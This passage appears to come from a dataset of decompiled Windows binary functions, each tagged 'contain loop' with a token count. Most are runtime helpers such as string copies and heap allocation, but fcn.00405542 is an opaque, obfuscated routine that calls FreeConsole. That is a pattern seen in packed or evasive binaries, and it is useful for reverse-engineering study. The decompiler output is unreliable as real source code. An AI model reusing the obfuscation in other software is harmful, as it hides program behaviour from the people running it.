        "decompiled_code": "\nuint __cdecl fcn.004038dc(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            piVar3 = arg_8h;\n            do {\n                iVar1 = *((arg_10h - arg_8h) + piVar3);\n                *piVar3 = iVar1;\n                piVar3 = piVar3 + 1;\n                if (iVar1 == 0) break;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                return 0;\n            }\n            *arg_8h = 0;\n            puVar2 = fcn.004039a4();\n            uVar4 = 0x22;\n            goto code_r0x004c6a39;\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.004039a4();\n    uVar4 = 0x16;\ncode_r0x004c6a39:\n    *puVar2 = uVar4;\n    fcn.00403751();\n    return uVar4;\n}\n",
        "token_count": 314
    },
    "00403b07": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403b07(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.00401d9d(arg_14h);\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 128
    },
    "00403ff3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403ff3(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (arg_8h < 0xffffffe1) {\n        if (arg_8h == 0) {\n            arg_8h = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5705b8, 0, arg_8h);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.0040483b();\n        } while ((iVar1 != 0) && (iVar1 = fcn.004040de(arg_8h),  iVar1 != 0));\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 202
    },
    "0040437c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040437c(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (arg_8h == 0) {\n        iVar1 = fcn.00403ff3(arg_ch);\n    }\n    else {\n        if (arg_ch == 0) {\n            fcn.00406302(arg_8h);\n        }\n        else {\n            if (arg_ch < 0xffffffe1) {\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x5705b8, 0, arg_8h, arg_ch);\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                    iVar1 = fcn.0040483b();\n                } while ((iVar1 != 0) && (iVar1 = fcn.004040de(arg_ch),  iVar1 != 0));\n            }\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0xc;\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 254
    },
    "00404390": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404390(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t unaff_EBP;\n    uint32_t uVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    fcn.004060f5(0);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    uVar2 = *(unaff_EBP + 0x10);\n    if (*(iVar1 + 0xc) < uVar2 || *(iVar1 + 0xc) == uVar2) {\n        uVar7 = uVar2 + 1;\n        if (uVar7 < 0x28) {\n            uVar7 = 0x28;\n        }\n        iVar5 = fcn.00403698(*(iVar1 + 8), uVar7 << 2);\n        if (iVar5 == 0) {\n            fcn.004010a5();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        *(iVar1 + 8) = iVar5;\n        while (*(iVar1 + 0xc) < uVar7) {\n            *(*(iVar1 + 8) + *(iVar1 + 0xc) * 4) = 0;\n            *(iVar1 + 0xc) = *(iVar1 + 0xc) + 1;\n        }\n    }\n    pcVar3 = *(**(unaff_EBP + 0xc) + 4);\n    (**0x573000)();\n    (*pcVar3)();\n    piVar4 = *(*(iVar1 + 8) + uVar2 * 4);\n    *(unaff_EBP + -0x10) = piVar4;\n    if (piVar4 != NULL) {\n        pcVar3 = *(*piVar4 + 8);\n        (**0x573000)();\n        puVar6 = (*pcVar3)();\n        *(unaff_EBP + -0x10) = puVar6;\n        if (puVar6 != NULL) {\n            pcVar3 = **puVar6;\n            (**0x573000)(1);\n            (*pcVar3)();\n        }\n    }\n    *(*(iVar1 + 8) + uVar2 * 4) = *(unaff_EBP + 0xc);\n    fcn.00403684();\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 618
    },
    "004046f1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004046f1(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.0040637f(arg_14h);\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 127
    },
    "00404c82": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c82(uint *arg_8h, uint8_t *arg_ch, uint8_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    for (; arg_ch != arg_10h; arg_ch = arg_ch + 1) {\n        fcn.0040665e(*arg_ch);\n    }\n    *arg_8h = arg_14h;\n    arg_8h[1] = arg_18h;\n    return;\n}\n",
        "token_count": 112
    },
    "00404e0d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404e0d(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint16_t *arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.00401d9d(*arg_18h);\n            arg_18h = arg_18h + 1;\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 151
    },
    "00404fa7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00404fa7(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x56f440 != 0) {\n        iVar2 = *0x56f440 * 0x18 + 0x56f410;\n        iVar1 = *0x56f440;\n        do {\n            (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iVar2);\n            *0x56f440 = *0x56f440 + -1;\n            iVar2 = iVar2 + -0x18;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 1;\n}\n",
        "token_count": 150
    },
    "00404fd9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404fd9(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_8h_00;\n    \n    if ((arg_8h == 0) || (arg_ch <= 0xffffffe0 / arg_8h)) {\n        arg_8h_00 = arg_8h * arg_ch;\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x5705b8, 8, arg_8h_00);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.0040483b();\n        } while ((iVar1 != 0) && (iVar1 = fcn.004040de(arg_8h_00),  iVar1 != 0));\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 256
    },
    "00405155": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405155(uint *arg_8h, uint arg_ch, uint arg_10h, uint8_t *arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.0040665e(*arg_14h);\n            arg_14h = arg_14h + 1;\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 144
    },
    "00405542": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041456b)\n\nuint fcn.00405542(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char cVar9;\n    uint32_t unaff_EBX;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    char cStack185;\n    uint uStack172;\n    uint uStack168;\n    uchar auStack164 [16];\n    uchar uStack148;\n    \n    auStack164 = ZEXT816(0);\n    uStack148 = 0;\n    uStack168 = 0x43650e66;\n    uVar7 = 0;\n    uStack172 = *0x56ebac;\n    uVar10 = *0x56ebac;\n    uVar11 = *0x56ebb0;\n    if (*0x56ebac != 0) {\ncode_r0x0041472b:\n        fcn.00402b6c();\n        (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)();\n        (*_sym.imp.KERNEL32.dll_FreeConsole)();\n        fcn.00403fad();\n        fcn.0040234c();\n        return 0;\n    }\ncode_r0x0041422c:\n    do {\n        uVar2 = auStack164[uVar7 - 4];\n        uVar4 = uVar2;\n        uVar1 = uVar11 + 1;\n        cVar3 = uVar7;\n        if (uVar10 < uVar1) {\n            if (uVar7 < uVar11) goto code_r0x0041472b;\n            unaff_EBX = cVar3 + uVar2 + (cVar3 + 0x92U & uVar2) * -2 + 0x94;\ncode_r0x0041425c:\n            if (uVar10 + uVar11 <= uVar7) {\n                if (uVar10 < uVar11 + 5) {\n                    unaff_EBX = cVar3 + uVar2 + (cVar3 - 0x36U & uVar2) * -2 + 0x44;\ncode_r0x004142f7:\n                    if (uVar11 + 10 < uVar10) {\n                        unaff_EBX = cVar3 + uVar2 + (cVar3 + 0x22U & uVar2) * -2 + 0x34;\ncode_r0x0041431a:\n                        if (uVar10 < 10) {\n                            if (uVar11 + 2 < uVar10) {\n                                unaff_EBX = (cVar3 + uVar2 + (cVar3 + 0xb4U & uVar2) * -2) - 0x38;\n                            }\n                            else {\n                                if (uVar10 == uVar1) {\n                                    unaff_EBX = cVar3 + uVar2 + (cVar3 + 0x48U & uVar2) * -2 + 0x50;\n                                    goto code_r0x00414218;\n                                }\n                                if (uVar10 == uVar11 + 2) {\n                                    cVar9 = cVar3 + uVar2 + 'p';\n                                    uVar5 = cVar3 + 0x70U & uVar2;\n                                    cStack185 = -0x10;\n                                    goto code_r0x00414422;\n                                }\n                                if (uVar10 == uVar11 + 3) {\n                                    unaff_EBX = (cVar3 + uVar2 + (cVar3 + 4U & uVar2) * -2) - 0x18;\n                                    goto code_r0x0041459b;\n                                }\n                                if (uVar10 == uVar11 + 4) {\n                                    unaff_EBX = cVar3 + uVar2 + (cVar3 - 0x40U & uVar2) * -2 + 0x80;\n                                    uVar7 = uVar7 - 1;\n                                    goto code_r0x0041421c;\n                                }\n                            }\n                            if (uVar11 < 2) {\n                                auStack164[uVar7 - 4] = unaff_EBX;\n                                goto code_r0x0041421c;\n                            }\n                            unaff_EBX = (cVar3 + uVar2 + '|' + (cVar3 + 0x7cU & uVar2) * -2) * '\\x02' + 0x38;\n                            goto code_r0x0041465a;\n                        }\n                        uVar5 = cVar3 + uVar2 * '\\x02' + (cVar3 + 0x10U & uVar2) * -2 + 0xa0;\n                        auStack164[uVar7 - 4] = uVar2 + cVar3 + (cVar3 - 0x26U & uVar2) * -2 + uVar5 + -0x1c;\n                    }\n                    else {\n                        if (uVar10 == uVar1) {\n                            unaff_EBX = cVar3 + uVar2 + (cVar3 + 0xb6U & uVar2) * -2 + 0xbc;\n                            goto code_r0x0041465a;\n                        }\n                        if (uVar10 == uVar11 + 3) {\n                            unaff_EBX = (cVar3 + uVar2 + (cVar3 - 0x22U & uVar2) * -2) - 0x34;\n                            uVar7 = uVar7 - 1;\n                            goto code_r0x0041421c;\n                        }\n                        if (uVar10 != uVar11 + 4) {\n                            if (uVar10 == uVar11 + 7) {\n                                cVar9 = cVar3 + uVar2 + '.';\n                                uVar5 = cVar3 + 0x2eU & uVar2;\n                                cStack185 = -0x42;\n                                goto code_r0x00414422;\n                            }\n                            goto code_r0x0041431a;\n                        }\n                        uVar5 = (cVar3 + uVar2 + (cVar3 + 6U & uVar2) * -2) - 0x24;\n                    }\n                    unaff_EBX = uVar5;\n                    uVar10 = uVar10 + uVar11;\n                    goto code_r0x0041459b;\n                }\n                if (uVar10 == uVar1) {\n                    unaff_EBX = cVar3 + uVar2 + (cVar3 + 0x24U & uVar2) * -2 + 0x28;\n                    goto code_r0x00414218;\n                }\n                if (uVar10 != uVar11 + 2) {\n                    if (uVar10 == uVar11 + 4) {\n                        unaff_EBX = cVar3 + uVar2 + (cVar3 + 0x9cU & uVar2) * -2 + 0x58;\n                        uVar7 = uVar7 - 1;\n                        goto code_r0x0041421c;\n                    }\n                    if (uVar10 == uVar11 + 7) {\n                        unaff_EBX = (cVar3 + uVar2 + (cVar3 + 0x30U & uVar2) * -2) - 0x20;\n                        goto code_r0x00414676;\n                    }\n                    goto code_r0x004142f7;\n                }\n                uVar5 = cVar3 + uVar2 + (cVar3 + 0xb8U & uVar2) * -2 + 0xb0;\ncode_r0x004144a6:\n                unaff_EBX = uVar5;\n                auStack164[uVar7 - 4] = uVar7 + uVar2 + (uVar7 + 0x38U & uVar2) * -2 + -0x50;\n                iVar8 = uVar7 - uVar10;\n                uVar10 = uVar10 + 1;\n                uVar4 = *(&uStack172 + iVar8 + 2);\n                uVar7 = iVar8 - 2;\ncode_r0x00414218:\n                uVar4 = uVar4 + uVar11;\n                goto code_r0x0041421a;\n            }\n            if (uVar10 == uVar1) {\n                unaff_EBX = cVar3 + uVar2 + (cVar3 - 0x34U & uVar2) * -2 + 0x38;\ncode_r0x0041465a:\n                auStack164[uVar7 - 4] = uVar2 + cVar3 + (cVar3 + 0x46U & uVar2) * -2 + '\\\\';\n            }\n            else {\n                if (uVar10 != uVar11 + 4) {\n                    if (uVar10 == uVar11 + 6) {\n                        cVar9 = cVar3 + uVar2 + 'D';\n                        uVar5 = cVar3 + 0x44U & uVar2;\n                        cStack185 = '$';\ncode_r0x00414422:\n                        uVar6 = uVar2 + cVar3 + (cVar3 + 0x6eU & uVar2) * -2 + 0x6c;\n                        auStack164[uVar7 - 4] = uVar6;\n                        uVar7 = (~uVar11 + uVar7) - uVar6;\n                        uVar5 = cVar9 + uVar5 * -2 + cStack185;\n                        uVar11 = uVar1;\n                        goto code_r0x004144a6;\n                    }\n                    unaff_EBX = (cVar3 + uVar2 + (cVar3 + 0x5eU & uVar2) * -2) - 0x34;\n                    uVar7 = 0;\n                    uVar10 = *0x56ebac;\n                    uVar11 = *0x56ebb0;\n                    goto code_r0x0041422c;\n                }\n                unaff_EBX = (cVar3 + uVar2 + (cVar3 + 0x60U & uVar2) * -2) - 0x40;\n            }\ncode_r0x00414676:\n            uVar7 = uVar7 - 1;\n            uVar11 = uVar1;\n        }\n        else {\n            if (uVar10 == uVar1) {\n                unaff_EBX = (cVar3 + uVar2 + (cVar3 + 0x5eU & uVar2) * -2) - 0x34;\n                goto code_r0x00414218;\n            }\n            if (uVar10 == uVar11 + 2) {\n                unaff_EBX = cVar3 + uVar2 + (cVar3 + 0x1aU & uVar2) * -2 + 100;\n            }\n            else {\n                if (uVar10 == uVar11 + 4) {\n                    unaff_EBX = (cVar3 + uVar2 + (cVar3 - 0x2aU & uVar2) * -2) - 4;\n                    uVar7 = uVar7 - 1;\n                    goto code_r0x0041421c;\n                }\n                if (uVar10 == uVar11 + 3) {\n                    unaff_EBX = cVar3 + uVar2 + (cVar3 - 2U & uVar2) * -2 + 0xc;\n                    goto code_r0x0041465a;\n                }\n                if (uVar7 < uVar11) goto code_r0x0041472b;\n                if (uVar10 != uVar11 + 5) goto code_r0x0041425c;\n                unaff_EBX = (cVar3 + uVar2 + (cVar3 + 10U & uVar2) * -2) - 0x3c;\n            }\ncode_r0x0041459b:\n            uVar4 = ~unaff_EBX;\ncode_r0x0041421a:\n            uVar7 = uVar7 + uVar4;\n        }\ncode_r0x0041421c:\n        uVar7 = uVar7 + 1;\n        if ((0x14 < uVar7) || (uVar7 < uVar10)) goto code_r0x0041472b;\n    } while( true );\n}\n",
        "token_count": 2790
    },
    "00405565": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00405565(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_FS_OFFSET;\n    \n    iVar2 = fcn.004037c9();\n    if (iVar2 != 0) {\n        iVar2 = *(*(in_FS_OFFSET + 0x18) + 4);\n        while( true ) {\n            iVar3 = 0;\n            LOCK();\n            iVar1 = iVar2;\n            if (*0x56ec1c != 0) {\n                iVar3 = *0x56ec1c;\n                iVar1 = *0x56ec1c;\n            }\n            *0x56ec1c = iVar1;\n            if (iVar3 == 0) break;\n            if (iVar2 == iVar3) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 195
    },
    "0040574a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040574a(char *arg_8h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = arg_8h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00403017(arg_8h, pcVar2 - (arg_8h + 1));\n    return;\n}\n",
        "token_count": 108
    },
    "00405a47": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a47(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.0040637f(arg_18h);\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 131
    },
    "00405b23": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b23(char *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    cVar1 = *arg_8h;\n    while ((cVar1 != '\\0' && (cVar1 != ***(*arg_ch + 0x88)))) {\n        pcVar2 = arg_8h + 1;\n        arg_8h = arg_8h + 1;\n        cVar1 = *pcVar2;\n    }\n    arg_8h = arg_8h + 1;\n    if (cVar1 != '\\0') {\n        cVar1 = *arg_8h;\n        while (((cVar1 != '\\0' && (cVar1 != 'e')) && (cVar1 != 'E'))) {\n            pcVar2 = arg_8h + 1;\n            arg_8h = arg_8h + 1;\n            cVar1 = *pcVar2;\n        }\n        cVar1 = arg_8h[-1];\n        pcVar2 = arg_8h;\n        while (pcVar2 = pcVar2 + -1,  cVar1 == '0') {\n            cVar1 = pcVar2[-1];\n        }\n        if (cVar1 == ***(*arg_ch + 0x88)) {\n            pcVar2 = pcVar2 + -1;\n        }\n        do {\n            cVar1 = *arg_8h;\n            pcVar2 = pcVar2 + 1;\n            *pcVar2 = cVar1;\n            arg_8h = arg_8h + 1;\n        } while (cVar1 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 378
    },
    "00405c81": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405c81(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4e304f;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004030e4(0);\n    puVar2 = *(param_1 + 0x28);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.00401a32(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x28) = 0;\n    puVar2 = *(param_1 + 0x2c);\n    while (puVar2 != NULL) {\n        puVar1 = *puVar2;\n        fcn.00401a32(puVar2);\n        puVar2 = puVar1;\n    }\n    *(param_1 + 0x2c) = 0;\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 277
    },
    "00405f56": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405f56(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    uint uVar4;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            pcVar3 = arg_8h;\n            do {\n                cVar1 = pcVar3[arg_10h - arg_8h];\n                *pcVar3 = cVar1;\n                pcVar3 = pcVar3 + 1;\n                if (cVar1 == '\\0') break;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                return 0;\n            }\n            *arg_8h = '\\0';\n            puVar2 = fcn.004039a4();\n            uVar4 = 0x22;\n            goto code_r0x004be5ea;\n        }\n        *arg_8h = '\\0';\n    }\n    puVar2 = fcn.004039a4();\n    uVar4 = 0x16;\ncode_r0x004be5ea:\n    *puVar2 = uVar4;\n    fcn.00403751();\n    return uVar4;\n}\n",
        "token_count": 308
    },
    "004062cb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004062cb(void)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    int16_t iVar3;\n    char **ppcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int16_t *piVar9;\n    char **ppcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    int16_t **ppiVar13;\n    int32_t iStack44;\n    int32_t iStack40;\n    char cStack32;\n    uint32_t uStack28;\n    char *pcStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    fcn.004057e5(0);\n    pcVar11 = 0x164;\n    pcStack20 = NULL;\n    iStack12 = 0;\n    ppcVar4 = *(iStack40 + 0x9c);\n    iStack16 = 0;\n    do {\n        pcVar12 = pcVar11;\n        if (iStack12 == 1) {\n            iVar6 = fcn.00403ff3(pcVar11);\n            iStack16 = 0;\n            if (iVar6 == 0) break;\n            fcn.0040314d(iVar6, 0, pcVar11);\n            pcVar12 = 0x164;\n            pcStack20 = pcVar11;\n            iStack16 = iVar6;\n        }\n        iVar6 = iStack16 - ppcVar4;\n        uStack28 = 0;\n        ppcVar10 = ppcVar4;\n        do {\n            if (iStack12 == 1) {\n                *(iVar6 + ppcVar10) = pcVar12 + iStack16;\n                iVar7 = fcn.00405f56(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            uStack28 = uStack28 + 1;\n            ppcVar10 = ppcVar10 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 7;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00405f56(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0xe;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00405f56(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0x1a;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00405f56(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 0xc);\n        uStack28 = 0;\n        ppcVar10 = ppcVar4 + 0x26;\n        do {\n            if (iStack12 == 1) {\n                *(ppcVar10 + iVar6) = pcVar12 + iStack16;\n                iVar7 = fcn.00405f56(pcVar12 + iStack16, pcStack20 - pcVar12, *ppcVar10);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            pcVar8 = *ppcVar10;\n            pcVar11 = pcVar8 + 1;\n            do {\n                cVar2 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar2 != '\\0');\n            pcVar12 = pcVar8 + pcVar12 + (1 - pcVar11);\n            ppcVar10 = ppcVar10 + 1;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 2);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa0) = pcVar12 + iStack16;\n            iVar7 = fcn.00405f56(pcVar12 + iStack16, pcStack20 - pcVar12, ppcVar4[0x28]);\n            if (iVar7 != 0) goto code_r0x004bcbd2;\n        }\n        pcVar8 = ppcVar4[0x28];\n        pcVar11 = pcVar8 + 1;\n        do {\n            cVar2 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n        } while (cVar2 != '\\0');\n        pcVar8 = pcVar8 + pcVar12 + (1 - pcVar11);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa4) = pcVar8 + iStack16;\n            iVar7 = fcn.00405f56(pcVar8 + iStack16, pcStack20 - pcVar8, ppcVar4[0x29]);\n            if (iVar7 != 0) goto code_r0x004bcbd2;\n        }\n        pcVar12 = ppcVar4[0x29];\n        pcVar11 = pcVar12 + 1;\n        do {\n            cVar2 = *pcVar12;\n            pcVar12 = pcVar12 + 1;\n        } while (cVar2 != '\\0');\n        pcVar12 = pcVar12 + pcVar8 + (1 - pcVar11);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xa8) = pcVar12 + iStack16;\n            iVar7 = fcn.00405f56(pcVar12 + iStack16, pcStack20 - pcVar12, ppcVar4[0x2a]);\n            if (iVar7 != 0) goto code_r0x004bcbd2;\n        }\n        pcVar11 = ppcVar4[0x2a];\n        pcVar8 = pcVar11 + 1;\n        do {\n            cVar2 = *pcVar11;\n            pcVar11 = pcVar11 + 1;\n        } while (cVar2 != '\\0');\n        pcVar11 = pcVar11 + pcVar12 + (1 - pcVar8);\n        if (iStack12 == 1) {\n            *(iStack16 + 0xac) = ppcVar4[0x2b];\n            *(iStack16 + 0xb0) = 0;\n        }\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x2d;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            pcVar11 = pcVar11 + (piVar9 - piVar1 >> 1) * 2 + 2;\n            uStack28 = uStack28 + 1;\n        } while (uStack28 < 7);\n        uStack28 = 0;\n        ppiVar13 = ppcVar4 + 0x34;\n        do {\n            for (; (pcVar11 & 1) != 0; pcVar11 = pcVar11 + 1) {\n            }\n            if (iStack12 == 1) {\n                iVar7 = iStack16 + (pcVar11 & 0xfffffffe);\n                *(ppiVar13 + iVar6) = iVar7;\n                iVar7 = fcn.004038dc(iVar7, pcStack20 - pcVar11 >> 1, *ppiVar13);\n                if (iVar7 != 0) goto code_r0x004bcbd2;\n            }\n            piVar9 = *ppiVar13;\n            piVar1 = piVar9 + 1;\n            do {\n                iVar3 = *piVar9;\n                piVar9 = piVar9 + 1;\n            } while (iVar3 != 0);\n            ppiVar13 = ppiVar13 + 1;\n            